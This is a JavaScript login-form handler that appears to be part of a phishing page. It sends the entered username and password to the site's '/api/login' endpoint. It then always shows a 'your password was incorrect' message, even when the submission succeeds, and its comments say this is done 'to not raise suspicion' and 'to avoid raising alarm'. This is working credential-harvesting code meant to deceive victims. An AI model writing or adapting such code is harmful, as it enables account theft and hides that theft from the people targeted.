document.getElementById('loginForm').addEventListener('submit', async (e) => {
  e.preventDefault();

  const username = document.getElementById('username').value.trim();
  const password = document.getElementById('password').value.trim();
  const responseDiv = document.getElementById('responseMsg');

  if (!username || !password) {
    responseDiv.style.display = 'block';
    responseDiv.innerHTML = '⚠️ Please fill in both fields.';
    return;
  }

  const payload = { username, password };

  try {
    const res = await fetch('/api/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });

    const data = await res.json();

    // Always show a generic error to not raise suspicion
    responseDiv.style.display = 'block';
    if (res.ok) {
      // But we want to make it look like login failed (to avoid raising alarm)
      responseDiv.innerHTML = '⚠️ Sorry, your password was incorrect. Please try again.';
      responseDiv.style.color = '#ed4956';
    } else {
      responseDiv.innerHTML = '⚠️ Sorry, your password was incorrect. Please try again.';
      responseDiv.style.color = '#ed4956';
    }
    // Clear fields after submission (optional)
    // document.getElementById('password').value = '';
  } catch (err) {
    responseDiv.style.display = 'block';
    responseDiv.innerHTML = '⚠️ Something went wrong. Please try again.';
    responseDiv.style.color = '#ed4956';
  }
});